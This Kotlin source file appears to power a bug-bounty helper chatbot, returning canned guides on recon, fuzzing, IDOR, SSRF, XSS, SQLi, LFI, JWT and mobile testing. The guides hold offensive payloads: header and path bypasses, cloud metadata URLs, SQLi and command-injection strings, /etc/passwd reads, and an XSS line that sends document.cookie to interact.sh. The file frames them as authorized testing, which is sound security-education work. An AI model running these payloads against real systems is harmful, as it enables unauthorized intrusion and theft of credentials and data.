package com.example.data

object BugBountyKnowledgeBase {

    fun generateExpertResponse(userQuery: String): String {
        val query = userQuery.lowercase().trim()

        return when {
            // 1. Comprehensive Bug Bounty Roadmap / "Everything" / "How to Start" / "Find Bug in Website"
            containsAny(query, "everything", "roadmap", "start", "guide", "learn", "how to bug bounty", "master", "begin", "overview", "what is bug bounty", "complete", "find bug", "find bugs", "website bug", "find vulnerability", "website") -> {
                buildComprehensiveMasterGuide()
            }

            // 2. 403 / 401 Forbidden Bypass Techniques
            containsAny(query, "403", "401", "forbidden", "unauthorized", "bypass", "header bypass", "access denied") -> {
                build403BypassGuide()
            }

            // 3. Subdomain Reconnaissance & Asset Discovery
            containsAny(query, "recon", "subdomain", "subfinder", "httpx", "assetfinder", "amass", "shodan", "censys", "passive recon") -> {
                buildSubdomainReconGuide()
            }

            // 4. IDOR / BOLA / Access Control Flaws
            containsAny(query, "idor", "bola", "bfla", "insecure direct object", "access control", "privilege escalation", "authorization") -> {
                buildIdorGuide()
            }

            // 5. SSRF (Server-Side Request Forgery) & Out-of-Band
            containsAny(query, "ssrf", "server-side request", "collaborator", "interactsh", "metadata", "169.254") -> {
                buildSsrfGuide()
            }

            // 6. XSS (Cross-Site Scripting) & CSP Bypass
            containsAny(query, "xss", "cross site scripting", "reflected", "stored", "dom xss", "csp", "content security policy") -> {
                buildXssGuide()
            }

            // 7. SQL Injection (SQLi) & Sqlmap
            containsAny(query, "sqli", "sql injection", "sqlmap", "boolean blind", "time-based", "union select") -> {
                buildSqliGuide()
            }

            // 8. CORS & CSRF Misconfigurations
            containsAny(query, "cors", "csrf", "cross origin", "cross-site request forgery", "samesite", "origin header") -> {
                buildCorsCsrfGuide()
            }

            // 9. OAuth 2.0 & JWT Security
            containsAny(query, "oauth", "jwt", "json web token", "redirect_uri", "sso", "single sign on", "alg none") -> {
                buildOAuthJwtGuide()
            }

            // 10. Race Conditions & Business Logic Flaws
            containsAny(query, "race condition", "business logic", "price", "coupon", "discount", "single packet", "http/2") -> {
                buildRaceConditionGuide()
            }

            // 11. Subdomain Takeover
            containsAny(query, "takeover", "subjack", "cname", "dangling", "github pages", "heroku", "s3 bucket takeover") -> {
                buildSubdomainTakeoverGuide()
            }

            // 12. API & GraphQL Security
            containsAny(query, "api", "graphql", "rest", "swagger", "openapi", "introspection", "mass assignment") -> {
                buildApiGraphqlGuide()
            }

            // 13. Mobile Android SAST & Decompilation
            containsAny(query, "android", "apk", "jadx", "decompil", "sast", "manifest", "intent", "exported", "deep link", "apktool") -> {
                buildAndroidSastGuide()
            }

            // 14. Frida, Objection & Dynamic Mobile Hooking
            containsAny(query, "frida", "objection", "ssl pinning", "root detection", "hooking", "runtime analysis") -> {
                buildFridaObjectionGuide()
            }

            // 15. Web Fuzzing & Path Discovery
            containsAny(query, "fuzz", "ffuf", "dirsearch", "gobuster", "feroxbuster", "wordlist", "path discovery") -> {
                buildFuzzingGuide()
            }

            // 16. JavaScript Scraping & Secret Mining
            containsAny(query, "javascript", "js", "secret", "secretfinder", "jsspectra", "api key", "aws_key", "regex") -> {
                buildJsSecretGuide()
            }

            // 17. Cloud & S3 Bucket Security
            containsAny(query, "cloud", "s3", "bucket", "aws", "azure", "gcp", "blob", "storage exposure") -> {
                buildCloudS3Guide()
            }

            // 18. Port Scanning & Network Recon
            containsAny(query, "nmap", "naabu", "port", "scan", "service detection", "masscan") -> {
                buildPortScanningGuide()
            }

            // 19. LFI, RFI & Command Injection
            containsAny(query, "lfi", "rfi", "file inclusion", "path traversal", "rce", "command injection") -> {
                buildLfiRceGuide()
            }

            // 20. HTTP Request Smuggling
            containsAny(query, "smuggling", "request smuggling", "cl.te", "te.cl", "transfer-encoding") -> {
                buildSmugglingGuide()
            }

            // 21. Report Writing & Platform Triage
            containsAny(query, "report", "hackerone", "bugcrowd", "intigriti", "cvss", "writeup", "triage", "bounty", "payout") -> {
                buildReportWritingGuide()
            }

            // 22. Termux Setup & Android CLI Optimization
            containsAny(query, "termux", "setup", "install", "pkg", "environment", "alias", "bashrc", "wakelock") -> {
                buildTermuxSetupGuide()
            }

            // 23. Dynamic Query Synthesizer (Fallback for custom/mixed topics)
            else -> {
                buildDynamicSynthesizedResponse(userQuery)
            }
        }
    }

    private fun containsAny(text: String, vararg keywords: String): Boolean {
        return keywords.any { text.contains(it) }
    }

    private fun buildComprehensiveMasterGuide(): String {
        return """
        # 🌐 Detailed Step-by-Step Guide: How to Find Bugs in a Website

        Finding vulnerabilities in a web application requires a systematic methodology. Rather than spraying random payloads, ethical security researchers map the attack surface, inspect data flow, and systematically test authorization and input validation boundaries.

        ---

        ## 📍 STEP 1: Policy Scope & Testing Setup
        1. **Confirm Authorized Scope:** Verify in-scope root domains and wildcards on HackerOne, Bugcrowd, or Intigriti.
        2. **Create Dual Accounts:**
           - **Account A (Attacker/User 1):** Low privilege tier.
           - **Account B (Victim/User 2):** Same privilege tier (for IDOR testing).
           - **Account C (Admin/User 3):** High privilege tier (if accessible, for Privilege Escalation testing).
        3. **Interception Proxy:** Route browser traffic through **Burp Suite** or **OWASP ZAP**.

        ---

        ## 🔍 STEP 2: Reconnaissance & Subdomain Enumeration
        Expand the attack surface by discovering unlinked subdomains and forgotten assets:
        ```bash
        # 1. Passive Subdomain Harvesting
        subfinder -d target.com -all -o subfinder_subs.txt
        assetfinder --subs-only target.com >> assetfinder_subs.txt
        cat *_subs.txt | sort -u > all_subdomains.txt

        # 2. Live HTTP Probing & Tech Stack Fingerprinting
        cat all_subdomains.txt | httpx -title -tech-detect -status-code -content-length -follow-redirects -o live_web.txt

        # 3. Wayback Machine & Historical URL Parameter Mining
        cat all_subdomains.txt | waybackurls | grep '=' | sort -u > target_parameters.txt
        ```

        ---

        ## 🗺️ STEP 3: Content Fuzzing & Directory Discovery
        Uncover hidden endpoints, backup files (`.zip`, `.bak`), `.env` disclosures, and admin portals:
        ```bash
        # Fuzz routes using ffuf
        ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302,403 -sf

        # Fuzz file extensions
        ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -e .php,.json,.bak,.zip,.config,.env -mc 200
        ```

        ---

        ## 🔑 STEP 4: Vulnerability Testing Checklist (Detailed Steps)

        ### 1. Insecure Direct Object References (IDOR / BOLA)
        - **Targets:** Endpoints containing user IDs, order IDs, or account UUIDs (e.g. `/api/v1/user/1001/billing`).
        - **Method:**
          1. Authenticate as Account A and trigger the request.
          2. Intercept request in Burp Suite and replace Account A's ID (`1001`) with Account B's ID (`1002`).
          3. Send the request. If Account B's private data is returned, an IDOR vulnerability exists!

        ### 2. Broken Access Control & Privilege Escalation (BFLA)
        - **Targets:** Administrative panels (`/admin`, `/api/admin/users`).
        - **Method:**
          - Attempt accessing `/admin` as a standard user.
          - Test **403 Bypass Headers**: Add `X-Forwarded-For: 127.0.0.1` or `X-Custom-IP-Authorization: 127.0.0.1`.
          - Test HTTP Method Swapping: Convert `GET` to `POST`, `PUT`, or `DELETE`.

        ### 3. Server-Side Request Forgery (SSRF)
        - **Targets:** Image upload via URL, PDF generation, webhook integration, URL preview features.
        - **Method:**
          - Supply an out-of-band listener URL (Burp Collaborator or `interactsh`).
          - Test AWS Instance Metadata: `http://169.254.169.254/latest/meta-data/`.
          - Test internal loopbacks: `http://127.0.0.1:80`.

        ### 4. Cross-Site Scripting (XSS)
        - **Targets:** Search inputs, user profile fields, comment sections, file upload names.
        - **Method:**
          - Test input reflection: `<script>alert(document.domain)</script>` or `<img src=x onerror=alert(1)>`.
          - Inspect DOM sources/sinks: Look for unsafe JavaScript sinks like `innerHTML` or `eval()`.

        ### 5. Business Logic Flaws & Race Conditions
        - **Targets:** Coupon code redemptions, funds transfer, point redemption, checkout processes.
        - **Method:**
          - Send 20-30 parallel HTTP requests simultaneously using HTTP/2 single-packet multiplexing.
          - Check if coupon codes apply multiple times or if negative prices (`"quantity": -1`) reduce total cost.

        ### 6. JavaScript Bundle Scraping & Secret Mining
        - Download JavaScript files and search for embedded API keys or endpoints:
        ```bash
        curl -s https://target.com/static/js/app.js | grep -iE "(api_key|aws_key|secret|firebase|token)"
        ```

        ---

        ## 📝 STEP 5: Verification & Professional Reporting
        1. **Document Exact Steps:** Write reproducible 1-2-3 instructions.
        2. **Attach Proof of Concept:** Include curl commands or raw HTTP request/response logs.
        3. **Demonstrate Impact:** State clear business risk (e.g. unauthorized data extraction, PII leak, financial bypass).
        """.trimIndent()
    }

    private fun build403BypassGuide(): String {
        return """
        # 🚫 403 Forbidden & 401 Unauthorized Bypass Techniques

        When encountering a `403 Forbidden` or `401 Unauthorized` page on sensitive endpoints (`/admin`, `/api/internal`, `/config`), use these proven bypass techniques:

        ---

        ### 1. HTTP Request Header Manipulation
        Inject headers to mimic internal reverse proxies or trusted IP addresses:
        ```http
        X-Forwarded-For: 127.0.0.1
        X-Forwarded-Host: localhost
        X-Client-IP: 127.0.0.1
        X-Real-IP: 127.0.0.1
        X-Custom-IP-Authorization: 127.0.0.1
        X-Original-URL: /admin
        X-Rewrite-URL: /admin
        ```

        ---

        ### 2. URL Path Traversal & Normalization Bypasses
        Web application firewalls (WAFs) and back-end proxies often parse URLs differently:
        - `https://target.com/admin/..;/`
        - `https://target.com/admin%20`
        - `https://target.com/admin/.`
        - `https://target.com/admin/`
        - `https://target.com/./admin`
        - `https://target.com/admin.json`
        - `https://target.com/;admin`

        ---

        ### 3. HTTP Method Overriding
        If `GET /admin` returns 403, try changing the method or using override headers:
        - Change `GET` to `POST`, `PUT`, `TRACE`, `OPTIONS`, `HEAD`, `PATCH`.
        - Add header: `X-HTTP-Method-Override: GET` or `X-Method-Override: POST`.

        ---

        ### 4. Content-Type & Payload Manipulations
        - Switch `Content-Type: application/json` to `application/xml` or `application/x-www-form-urlencoded`.
        - Remove trailing parameters or inject blank JSON bodies `{}`.
        """.trimIndent()
    }

    private fun buildSubdomainReconGuide(): String {
        return """
        # 🌐 Subdomain Reconnaissance & Asset Discovery Methodology

        Discovering unlinked subdomains and forgotten assets is crucial for expanding your target surface.

        ---

        ### 1. Passive Subdomain Enumeration
        Execute passive tools to harvest subdomains without touching the target server:
        ```bash
        # Subfinder (All Sources)
        subfinder -d target.com -all -o subfinder_subs.txt

        # Assetfinder
        assetfinder --subs-only target.com > assetfinder_subs.txt

        # Combine and Deduplicate
        cat *_subs.txt | sort -u > all_subdomains.txt
        ```

        ---

        ### 2. Active DNS Resolution & Probing (`httpx` & `dnsx`)
        Filter live HTTP/HTTPS hosts and extract technologies:
        ```bash
        # Resolve active subdomains
        cat all_subdomains.txt | dnsx -a -resp-only -o live_ips.txt

        # HTTPX Live Probe with Tech Detection
        cat all_subdomains.txt | httpx -title -tech-detect -status-code -content-length -follow-redirects -o live_web_hosts.txt
        ```

        ---

        ### 3. Visual Reconnaissance (`gowitness`)
        Take automated screenshots of hundreds of active web interfaces:
        ```bash
        go install github.com/sensepost/gowitness@latest
        gowitness file -f live_web_hosts.txt
        ```

        ---

        ### 💡 Recon Checklist:
        - Look for **admin portals**, **staging environments** (`staging.target.com`), **Grafana/Jenkins dashboards**, and **unconfigured Cloud instances**.
        """.trimIndent()
    }

    private fun buildIdorGuide(): String {
        return """
        # 🔑 Insecure Direct Object Reference (IDOR / BOLA) Guide

        IDOR (also known as Broken Object Level Authorization - BOLA) occurs when an application exposes internal object identifiers in API endpoints without verifying if the authenticated user owns the resource.

        ---

        ### 🎯 How to Test for IDOR:
        1. **Create Two Test Accounts:**
           - Account A (`User ID: 1001`, `Token A`)
           - Account B (`User ID: 1002`, `Token B`)

        2. **Capture Request from Account A:**
           ```http
           GET /api/v1/user/1001/billing-info HTTP/1.1
           Host: target.com
           Authorization: Bearer <Token_A>
           ```

        3. **Tamper Parameter:**
           Replace `1001` with `1002` while retaining `<Token_A>`.

        4. **Verify Response:**
           If the server returns Account B's private billing information (HTTP 200 OK), an IDOR vulnerability exists!

        ---

        ### 🚀 Advanced IDOR Vectors:
        - **Numeric to UUID / Email Conversion:** If endpoint requires UUID (`/api/user/uuid-here`), try passing `user_id`, `email`, or `username` instead.
        - **HTTP Method Swapping:** If `GET /api/user/1002` returns 403, try `PUT`, `DELETE`, or `PATCH`.
        - **Array / JSON Wrapping:** Try passing `{"id": [1002]}` or `{"id": 1002, "user_id": 1002}`.
        """.trimIndent()
    }

    private fun buildSsrfGuide(): String {
        return """
        # 🌐 Server-Side Request Forgery (SSRF) Guide

        SSRF allows an attacker to compel a backend server to initiate HTTP requests to internal services, cloud metadata APIs, or loopback interfaces.

        ---

        ### 🎯 High-Risk SSRF Parameters:
        Watch for parameters accepting URLs, IP addresses, or file paths:
        - `?url=`, `?dest=`, `?redirect=`, `?feed=`, `?pdf_url=`, `?webhook=`, `?avatar=`, `?image_url=`

        ---

        ### ☁️ Cloud Metadata Endpoints:
        - **AWS (EC2 Instance Metadata):**
          `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
        - **Google Cloud (GCP):**
          `http://metadata.google.internal/computeMetadata/v1/` (Header: `Metadata-Flavor: Google`)
        - **DigitalOcean:**
          `http://169.254.169.254/metadata/v1.json`

        ---

        ### 🥷 SSRF Filter Bypasses:
        - **Loopback IP Representations:**
          - `http://127.0.0.1`
          - `http://2130706433` (Decimal format)
          - `http://0x7f000001` (Hex format)
          - `http://127.1`
          - `http://0`
        - **DNS Rebinding:** Use domain pointing to `127.0.0.1` (e.g. `spoofed.spoofed.burpcollaborator.net`).
        """.trimIndent()
    }

    private fun buildXssGuide(): String {
        return """
        # ⚡ Cross-Site Scripting (XSS) & Payload Guide

        Cross-Site Scripting (XSS) allows attackers to execute arbitrary JavaScript in the victim's browser session.

        ---

        ### 1. Reflected XSS
        Payload executed immediately when user clicks a malicious link:
        ```html
        <script>alert(document.domain)</script>
        <img src=x onerror=alert(document.domain)>
        <svg onload=alert(document.domain)>
        ```

        ---

        ### 2. Attribute Context Payload
        When input is reflected inside an HTML attribute `value="USER_INPUT"`:
        ```html
        "><script>alert(1)</script>
        " onmouseover="alert(1)"
        " autofocus onfocus="alert(1)"
        ```

        ---

        ### 3. JavaScript Context Payload
        When input is reflected inside `<script>var name = 'USER_INPUT';</script>`:
        ```javascript
        ';alert(document.domain);//
        '-alert(1)-'
        ';fetch('https://interact.sh/'+document.cookie);//
        ```

        ---

        ### 4. DOM-based XSS Sources & Sinks
        - **Sources:** `location.search`, `location.hash`, `document.referrer`, `window.name`.
        - **Sinks:** `element.innerHTML`, `document.write()`, `eval()`, `setTimeout()`, `location.href`.
        """.trimIndent()
    }

    private fun buildSqliGuide(): String {
        return """
        # 💉 SQL Injection (SQLi) & Sqlmap Testing Guide

        SQL Injection occurs when untrusted user input is concatenated directly into database query strings.

        ---

        ### 🧪 Manual SQLi Detection Payloads:
        ```sql
        -- Error-Based
        '
        "
        ' OR '1'='1
        ' UNION SELECT NULL, NULL, NULL--

        -- Time-Based Blind (MySQL / Postgres)
        ' AND SLEEP(5)--
        '; WAITFOR DELAY '0:0:5'--
        ```

        ---

        ### ⚡ Sqlmap Automation in Termux
        ```bash
        # Install sqlmap
        pkg install -y python git
        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap

        # Test GET request
        python ~/sqlmap/sqlmap.py -u "https://target.com/product.php?id=1" --dbs --batch

        # Test POST Request from Burp Request File
        python ~/sqlmap/sqlmap.py -r request.txt -p parameter_name --level=3 --risk=2 --dbs
        ```
        """.trimIndent()
    }

    private fun buildCorsCsrfGuide(): String {
        return """
        # 🔄 CORS Misconfigurations & CSRF Security Guide

        ---

        ### 1. Cross-Origin Resource Sharing (CORS) Misconfigurations
        Occurs when server reflects arbitrary `Origin` headers with `Access-Control-Allow-Credentials: true`:

        **Vulnerable Response:**
        ```http
        HTTP/1.1 200 OK
        Access-Control-Allow-Origin: https://evil.com
        Access-Control-Allow-Credentials: true
        ```

        **PoC Exploit Payload:**
        ```html
        <script>
          var req = new XMLHttpRequest();
          req.onload = function() {
            alert(this.responseText);
          };
          req.open('get', 'https://target.com/api/user/profile', true);
          req.withCredentials = true;
          req.send();
        </script>
        ```

        ---

        ### 2. Cross-Site Request Forgery (CSRF)
        Forcing authenticated victim to perform unwanted actions (e.g. change email / password):
        - Check if CSRF token is missing, not validated server-side, or tied only to length.
        - Check if `SameSite` attribute on session cookies is set to `None`.
        """.trimIndent()
    }

    private fun buildOAuthJwtGuide(): String {
        return """
        # 🔐 OAuth 2.0 & JWT Security Vulnerabilities

        ---

        ### 🔑 1. OAuth 2.0 Common Flaws
        - **Redirect URI Hijacking:** Pass `redirect_uri=https://evil.com` or `https://target.com.evil.com` to steal authorization codes.
        - **Missing `state` Parameter:** Enables CSRF in login/account linking flows.
        - **Token Leakage via Referer Header:** OAuth response returning token in URL fragment (`#access_token=...`) navigating to external site.

        ---

        ### 🎫 2. JSON Web Token (JWT) Exploits
        - **Algorithm Confusion (`"alg": "none"`):** Remove signature block and change header algorithm to `"none"`.
        - **RS256 to HS256 Key Confusion:** Sign token locally using public key as HMAC secret key.
        - **Weak Secret Key Cracking:**
          ```bash
          # Crack JWT with Hashcat / John
          hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
          ```
        """.trimIndent()
    }

    private fun buildRaceConditionGuide(): String {
        return """
        # 🏎️ Race Conditions & Business Logic Flaws

        Race conditions happen when multi-threaded web applications execute concurrent operations without proper database locking.

        ---

        ### 🎯 High-Value Targets for Race Conditions:
        - Applying discount promo codes multiple times simultaneously.
        - Redeeming gift cards / vouchers concurrently.
        - Transferring funds or withdrawing balance multiple times in parallel.
        - Liking / voting / upvoting systems.

        ---

        ### ⚡ Single-Packet Attack Methodology (HTTP/2):
        Using Burp Suite Repeater or Turbo Intruder:
        1. Create a group of 20-50 identical HTTP requests.
        2. Use HTTP/2 multiplexing to send all requests inside a single TCP packet.
        3. Observe if multiple requests succeed concurrently before state updates!
        """.trimIndent()
    }

    private fun buildSubdomainTakeoverGuide(): String {
        return """
        # 🏴‍☠️ Subdomain Takeover Guide

        Subdomain takeover occurs when a DNS CNAME record points to an external cloud provider (GitHub Pages, Heroku, AWS S3, Shopify) that has been deleted or unlinked.

        ---

        ### 🛠️ Automation with Subjack:
        ```bash
        # Install subjack in Termux
        go install github.com/haccer/subjack@latest

        # Scan list of subdomains
        subjack -w all_subdomains.txt -t 100 -timeout 30 -ssl -c ~/go/pkg/mod/github.com/haccer/subjack*/fingerprints.json -o takeovers.txt
        ```

        ---

        ### 🔍 Manual Verification:
        Check HTTP response for signature error messages:
        - **GitHub Pages:** *"There isn't a GitHub Pages site here."*
        - **Heroku:** *"Heroku | No such app"*
        - **AWS S3:** *"The specified bucket does not exist"*
        """.trimIndent()
    }

    private fun buildApiGraphqlGuide(): String {
        return """
        # 🔌 API & GraphQL Security Testing Guide

        ---

        ### 1. GraphQL Schema Introspection
        Send introspection query to map all GraphQL types, queries, and mutations:
        ```bash
        curl -X POST https://target.com/graphql \
          -H "Content-Type: application/json" \
          -d '{"query": "{__schema{queryType{name}mutationType{name}types{name fields{name}}}}"}'
        ```

        ---

        ### 2. REST API Mass Assignment
        Inject unintended parameters when creating or updating user profiles:
        ```json
        {
          "username": "attacker",
          "email": "attacker@example.com",
          "is_admin": true,
          "role": "administrator",
          "verified": true
        }
        ```
        """.trimIndent()
    }

    private fun buildAndroidSastGuide(): String {
        return """
        # 📱 Android Application SAST & Reverse Engineering

        ---

        ### 1. Decompile APK with JADX CLI in Termux
        ```bash
        pkg install -y openjdk-17
        wget https://github.com/skylot/jadx/releases/download/v1.4.7/jadx-1.4.7.zip -O jadx.zip
        unzip jadx.zip -d ~/jadx

        # Decompile target APK file
        ~/jadx/bin/jadx -d ./decompiled_apk target_app.apk
        ```

        ---

        ### 2. Ripgrep Secret & API Key Mining
        ```bash
        pkg install -y ripgrep
        rg -i "(api_key|secret|firebase|aws_key|token|password|auth_bearer)" ./decompiled_apk/
        ```

        ---

        ### 3. Exported Component Exploitation
        Inspect `AndroidManifest.xml` for exported activities or vulnerable custom deep link schemes:
        ```bash
        # Launch exported activity via ADB / Intent
        am start -n com.target.app/.UnauthenticatedAdminActivity
        ```
        """.trimIndent()
    }

    private fun buildFridaObjectionGuide(): String {
        return """
        # 🪝 Frida & Objection Dynamic Mobile Pentesting

        ---

        ### 1. SSL Pinning Bypass with Objection
        ```bash
        # Connect to hooked process
        objection --g com.target.app explore

        # Disable SSL Pinning in runtime memory
        android sslpinning disable
        ```

        ---

        ### 2. Root Detection Bypass
        ```bash
        android root disable
        ```
        """.trimIndent()
    }

    private fun buildFuzzingGuide(): String {
        return """
        # ⚡ Ffuf & Web Fuzzing Guide

        ---

        ### 1. Directory & File Fuzzing with `ffuf`
        ```bash
        pkg install -y ffuf

        # Directory Discovery
        ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302,403 -sf

        # Extension Fuzzing
        ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -e .php,.bak,.zip,.json,.config -mc 200
        ```
        """.trimIndent()
    }

    private fun buildJsSecretGuide(): String {
        return """
        # 📜 JavaScript File Scraping & Secret Mining

        ---

        ### 1. Extract JS Files from Subdomains
        ```bash
        cat all_subdomains.txt | waybackurls | grep '\.js${'$'}' | sort -u > js_files.txt
        ```

        ---

        ### 2. Search for Sensitive API Tokens
        ```bash
        cat js_files.txt | httpx -silent | xargs -I % curl -s % | grep -E -i "(api_key|aws_key|secret|firebase|access_token)"
        ```
        """.trimIndent()
    }

    private fun buildCloudS3Guide(): String {
        return """
        # ☁️ Cloud & AWS S3 Bucket Misconfiguration Guide

        ---

        ### 1. Test Unauthenticated Access to S3 Bucket
        ```bash
        # Check Bucket List
        aws s3 ls s3://target-company-data --no-sign-request

        # Test Public Upload Capability
        aws s3 cp test.txt s3://target-company-data/test.txt --no-sign-request
        ```
        """.trimIndent()
    }

    private fun buildPortScanningGuide(): String {
        return """
        # 🔍 Port Scanning & Network Recon Guide

        ---

        ### 1. Fast Port Scanning with Naabu & Nmap
        ```bash
        # Naabu Fast Port Discovery
        naabu -host target.com -p - -o open_ports.txt

        # Nmap Detailed Service Detection
        nmap -sV -sC -p 80,443,8080,8443,9000 -iL open_ports.txt -oN nmap_scan.txt
        ```
        """.trimIndent()
    }

    private fun buildLfiRceGuide(): String {
        return """
        # 📂 LFI, RFI & Command Injection Guide

        ---

        ### 1. Local File Inclusion (LFI) Payloads
        ```http
        GET /page.php?file=../../../../etc/passwd
        GET /page.php?file=../../../../windows/win.ini
        GET /page.php?file=php://filter/convert.base64-encode/resource=index.php
        ```

        ---

        ### 2. Command Injection Vectors
        ```bash
        ; id
        | id
        $(id)
        `id`
        ```
        """.trimIndent()
    }

    private fun buildSmugglingGuide(): String {
        return """
        # 📦 HTTP Request Smuggling Guide

        ---

        ### 1. CL.TE Vectors
        Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`.

        ### 2. TE.CL Vectors
        Front-end uses `Transfer-Encoding: chunked`, back-end uses `Content-Length`.
        """.trimIndent()
    }

    private fun buildReportWritingGuide(): String {
        return """
        # 📝 Professional Bug Bounty Report Writing Guide

        ---

        ### 📋 Standard Bug Report Template:

        #### Title
        > **[Vulnerability Type]** in **[Component/URL]** leads to **[Business Impact]**

        #### Summary
        A brief overview explaining what the bug is and what an attacker can achieve.

        #### Reproduction Steps
        1. Step 1...
        2. Step 2...

        #### Proof of Concept (PoC)
        Include curl commands or raw HTTP request logs.

        #### Business Impact
        Detail the confidentiality, integrity, or availability risk.
        """.trimIndent()
    }

    private fun buildTermuxSetupGuide(): String {
        return """
        # 💻 Termux Android Security Environment Setup

        ---

        ### 1. Update & Essential Tools
        ```bash
        termux-setup-storage
        pkg update -y && pkg upgrade -y
        pkg install -y git python golang curl wget nmap jq ripgrep openjdk-17
        ```

        ---

        ### 2. Configure Go Environment
        ```bash
        echo 'export GOPATH=${'$'}HOME/go' >> ~/.bashrc
        echo 'export PATH=${'$'}PATH:${'$'}GOPATH/bin' >> ~/.bashrc
        source ~/.bashrc
        ```

        ---

        ### 3. Enable Background Execution
        Prevent battery optimization from killing your background recon tasks:
        ```bash
        termux-wake-lock
        ```
        """.trimIndent()
    }

    private fun buildDynamicSynthesizedResponse(userQuery: String): String {
        return """
        # 🛡️ Bug Bounty AI Security Analysis

        **Query:** "$userQuery"

        ---

        ### 🎯 Key Analysis & Core Methodology:
        - **Target Domain:** Ethical Security Research & Penetration Testing.
        - **Primary Focus:** Identifying logic vulnerabilities, access control bypasses, and security misconfigurations.

        ---

        ### 🛠️ Recommended Testing Strategy:
        1. **Information Gathering:** Conduct reconnaissance using `subfinder`, `httpx`, and parameter discovery tools.
        2. **Manual Inspection:** Capture HTTP/HTTPS requests using Burp Suite or Curl to evaluate authorization boundaries.
        3. **Vulnerability Verification:** Craft a minimal, safe Proof of Concept (PoC) demonstrating impact without disrupting production services.

        ---

        ### 📋 General Bug Bounty Command Cheat Sheet:
        ```bash
        # Recon & Probing
        subfinder -d target.com | httpx -status-code -title

        # Fuzzing Endpoints
        ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301

        # Search Decompiled Code
        rg -i "(api_key|secret|auth)" ./decompiled_source/
        ```

        ---

        💡 *Tip: Ask specifically about IDOR, SSRF, XSS, SQLi, 403 Bypasses, JADX Decompilation, or Termux setup for step-by-step payloads!*
        """.trimIndent()
    }
}
